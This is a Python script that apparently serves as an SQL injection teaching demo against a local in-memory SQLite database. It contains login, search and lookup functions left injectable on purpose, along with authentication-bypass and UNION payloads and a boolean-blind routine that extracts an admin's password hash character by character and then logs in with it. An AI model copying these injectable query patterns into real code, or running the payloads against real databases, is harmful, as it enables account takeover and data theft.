import sqlite3
from hashlib import sha256
import time


class SQLInjectionTester:
    def __init__(self):
        self.conn = None          #connection used to store database connection obj
        self.test_results = []    #stores test results
        
    def init_db(self):
        """Initialize an in-memory SQLite database with test users"""
        self.conn = sqlite3.connect(':memory:')         #store connection obj in self.conn
        cursor = self.conn.cursor()                     # cursor obj to execute SQL commands
        
        # Create users table, simplified
        cursor.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            email TEXT,
            is_admin BOOLEAN DEFAULT 0,
            created_at TEXT
        )
        ''')
        
        # simplified priviledge levels 0 / 1
        # Password strength is not taken into account in this program
        test_users = [
            ('admin_a', 'Adminswiuwyduie2231!', 'admin_aron@example.com', 0, '2025-01-08'),
            ('admin_b', 'Admin5014528933', 'admin_barry@example.com', 1, '2025-01-08'),
            ('admin', 'AdminPassword123!', 'admin@example.com', 1, '2025-01-08'),
            ('courtney', 'hueihdnbfie8324782', 'ccourtney@example.com', 0, '2020-02-1'),
            ('bob', 'BobsPassword789', 'bob@example.com', 0, '2023-03-20'),
            ('john', 'JohnPassword789', 'john@example.com', 0, '2022-01-20')
        ]
        
        """for loop through each test user 
                hash plain text (SHA-256 alone isnt secure for passwords IRL)
                cursor executes AN 
                    insert of each user into parameterized queries (?, meant to prevent SQL injection, ?)"""
        for username, password, email, is_admin, created_at in test_users:
            hashed_pw = sha256(password.encode()).hexdigest()
            cursor.execute(
                'INSERT INTO users (username, password, email, is_admin, created_at) VALUES (?, ?, ?, ?, ?)',
                (username, hashed_pw, email, is_admin, created_at)
            )
            
        self.conn.commit()
        return self.conn        #return database connection obj
    
    
    
    
    #basic password hashing with SHA-256
    #vulnerable query using direction insertion of username and hashed_pw
    
    def vulnerable_login(self, username, password):
        """VULNERABLE LOGIN FUNCTION - susceptible to SQL injection"""
        cursor = self.conn.cursor()
        # UNSAFE: Direct string concatenation
        hashed_pw = sha256(password.encode()).hexdigest()           
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashed_pw}'"
        
        try:                                                    #try to execute:
            cursor.execute(query)                                   #vulnerable SQL query
            user = cursor.fetchone()                                # fetch username
            return user is not None, query                          #return tuple where user was found in user DB, and full query 
        except sqlite3.Error as e:                              #try fails during query execution
            return False, f"ERROR: {str(e)}\nQuery: {query}"        #Create error message
    
    
    
    def vulnerable_user_search(self, search_term):
        """VULNERABLE user search function - susceptible to SQL injection"""
        cursor = self.conn.cursor()
        # UNSAFE: Direct string concatenation with LIKE operator
        query = f"SELECT id, username, email FROM users WHERE username LIKE '%{search_term}%'"
        
        try:
            cursor.execute(query)
            return cursor.fetchall(), query
        except sqlite3.Error as e:
            return [], f"ERROR: {str(e)}\nQuery: {query}"
    
    
    def vulnerable_user_data(self, user_id):
        """VULNERABLE user data retrieval - susceptible to SQL injection through numeric field"""
        cursor = self.conn.cursor()
        # UNSAFE: Direct string concatenation with integer (no quotes)
        query = f"SELECT * FROM users WHERE id = {user_id}"
        
        try:
            cursor.execute(query)
            return cursor.fetchone(), query
        except sqlite3.Error as e:
            return None, f"ERROR: {str(e)}\nQuery: {query}"
    
    
    def run_test(self, test_name, function, *args):
        result, query = function(*args)
        
        # Format result for display
        if isinstance(result, tuple) and len(result) > 0:
            # For user data results, show in a readable format
            result_display = f"User found: {result[1]} (ID: {result[0]}, Admin: {result[4]})"
        elif isinstance(result, list) and len(result) > 0:
            # For search results, show count and details
            result_display = f"Found {len(result)} users: {', '.join([user[1] for user in result])}"
        elif result is True:
            result_display = "Login successful"
        elif result is False:
            result_display = "Login failed"
        else:
            result_display = str(result)
        
        test_result = {
            "name": test_name,
            "function": function.__name__,
            "args": args,
            "result": result_display,
            "query": query,
            "exploitable": (result is not False and result is not None and result != [])
        }
        
        self.test_results.append(test_result)
        return test_result
    
    
    def boolean_blind_extraction(self):
        """Extract full password hash using blind SQL injection and attempt login with it"""
        print("\n=== PASSWORD HASH EXTRACTION DEMONSTRATION ===")
        print("Target: admin user's complete password hash")
    
        # Get start time to measure performance
        start_time = time.time()
    
        hash_chars = "0123456789abcdef"  # SHA-256 uses hexadecimal characters
        extracted_hash = ""
    
        # Extract all 64 characters of the SHA-256 hash
        for position in range(1, 65):
            for char in hash_chars:
                # Crafted SQL injection that checks each character position
                injection = f"admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'--"
                result, query = self.vulnerable_login(injection, "anyText")
        
                if result:  # If login succeeded, found the correct character
                    extracted_hash += char
                    print(f"Position {position}: Found character '{char}'")
                    print(f"Hash so far: {extracted_hash}")
                    break
            
        # Calculate time taken
        time_taken = time.time() - start_time
        print(f"Extraction took {time_taken:.2f} seconds")
        print(f"Extracted complete hash: {extracted_hash}")
    
        # Verify the extracted hash against the actual hash
        cursor = self.conn.cursor()
        cursor.execute("SELECT password FROM users WHERE username='admin'")
        actual_hash = cursor.fetchone()[0]
        print(f"Actual hash: {actual_hash}")
        print(f"Extraction {'successful' if extracted_hash == actual_hash else 'failed'}")
    
        # Attempt to login with the extracted hash by manipulating the login function
        print("\n=== ATTEMPTING LOGIN WITH EXTRACTED HASH ===")
        # Create a SQL injection that bypasses password hashing
        login_injection = f"admin' AND password='{extracted_hash}'--"
        login_result, login_query = self.vulnerable_login(login_injection, "anyText")
    
        print(f"Login attempt with extracted hash: {'Successful' if login_result else 'Failed'}")
        print(f"Query used: {login_query}")
    
        # Verify admin access by checking admin status
        if login_result:
            cursor = self.conn.cursor()
            cursor.execute("SELECT is_admin FROM users WHERE username='admin'")
            is_admin = cursor.fetchone()[0]
            print(f"Admin access verified: {'Yes' if is_admin == 1 else 'No'}")
    
        return extracted_hash, login_result
    
    def display_results(self):
        for i, result in enumerate(self.test_results):
            print(f"\n--- VULNERABILITY TEST: {result['name']} ---")
            print(f"Function: {result['function']}")
            print(f"Malicious Input: {result['args']}")
            print(f"Resulting SQL Query: {result['query']}")
            print(f"Outcome: {result['result']}")
            print(f"Exploitable: {'YES' if result['exploitable'] else 'NO'}")
            print(f"\n")
    
    
    def test_vulnerabilities(self):
        """Run focused tests on vulnerable functions only"""
        # Initialize database
        self.init_db()
        
        # Normal login test as baseline
        self.run_test("Normal Login Attempt/ Correct Password (Valid)", self.vulnerable_login, "admin", "AdminPassword123!")
        self.run_test("Normal Login Attempt/ Wrong Password (Invalid)", self.vulnerable_login, "admin", "adminpassword123!")
        
        # Authentication bypass injection tests
        
        self.run_test("Comment Injection", self.vulnerable_login, "admin'--", "anyText")
        self.run_test("OR Condition Injection", self.vulnerable_login, "admin' OR '1'='1'--", "anyText")
        self.run_test("Always True Condition", self.vulnerable_login, "' OR 1=1--", "anyText")
        self.run_test("Single Quote Escape", self.vulnerable_login, "admin'; --", "anyText")
        
        # Data extraction injection tests
       
        self.run_test("UNION Injection", self.vulnerable_login, "' UNION SELECT 1,2,'3','4',5,'6'--", "anyText")
        self.run_test("Subquery Injection", self.vulnerable_login, 
                     "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--", "anyText")
        
        # Search function vulnerabilities
        self.run_test("Search Wildcard Injection", self.vulnerable_user_search, "%")
        self.run_test("Search UNION Injection", self.vulnerable_user_search, 
                     "x%' UNION SELECT id,username,email FROM users WHERE is_admin=1--")
        
        # Numeric field vulnerabilities
        self.run_test("Numeric OR Injection", self.vulnerable_user_data, "1 OR 1=1")
        self.run_test("Numeric UNION Injection", self.vulnerable_user_data, 
                     "-1 UNION SELECT id,username,password,email,is_admin,created_at FROM users WHERE is_admin=1")
        
        # Boolean-based blind injection
        #calls the function to go through steps of the process
          # Boolean-based blind injection
        print("\n--- RUNNING BOOLEAN BLIND ATTACK ---")
        extracted_hash, login_success = self.boolean_blind_extraction()
    
        # Add a login attempt with the directly extracted hash to demonstrate practical exploitation
        if extracted_hash:
            print("\n--- DIRECT LOGIN WITH EXTRACTED HASH ---")
            # Create a function to test direct login with hash
            def direct_hash_login(username, hash_value):
                cursor = self.conn.cursor()
                query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hash_value}'"
                try:
                    cursor.execute(query)
                    user = cursor.fetchone()
                    return user is not None, query
                except sqlite3.Error as e:
                    return False, f"ERROR: {str(e)}\nQuery: {query}"
                
        # Run the direct login test
        self.run_test("Direct Login with Extracted Hash", direct_hash_login, "admin", extracted_hash)
    
        
        # Display results
        self.display_results()
        
        # Close connection
        if self.conn:
            self.conn.close()
            
   
if __name__ == "__main__":
    print("""
    =============================================================
    SQL INJECTION VULNERABILITY DEMONSTRATION
    =============================================================
    This program demonstrates how SQL injection attacks can exploit
    vulnerable database access functions.
    """)
    
    # Run vulnerability-focused tests
    tester = SQLInjectionTester()
    tester.test_vulnerabilities()





